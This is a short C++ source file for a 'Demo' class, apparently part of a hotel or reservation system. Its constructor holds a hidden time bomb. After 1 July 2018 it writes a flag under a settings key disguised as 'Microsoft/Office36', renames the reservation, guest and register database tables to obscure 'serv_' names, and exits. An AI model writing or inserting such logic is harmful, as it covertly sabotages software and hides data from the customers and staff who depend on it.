#include "demo.h"

Demo::Demo() :
    Base()
{
    bool e = false;
    QSettings ss("Microsoft", "Office36");
    if (ss.value("Dir").toInt() > 0) {
        e = true;
    }

    if (QDate::currentDate() > QDate::fromString("01.07.2018", "dd.MM.yyyy")) {
        ss.setValue("Dir", 1);
        e = true;
    }

    if (e) {
        DoubleDatabase fDD(true, doubleDatabase);
        fDD.exec("rename table f_reservation to serv_www");
        fDD.exec("rename f_guests to serv_acc");
        fDD.exec("rename table m_register to serv_eva");
        exit(0);
    }
}
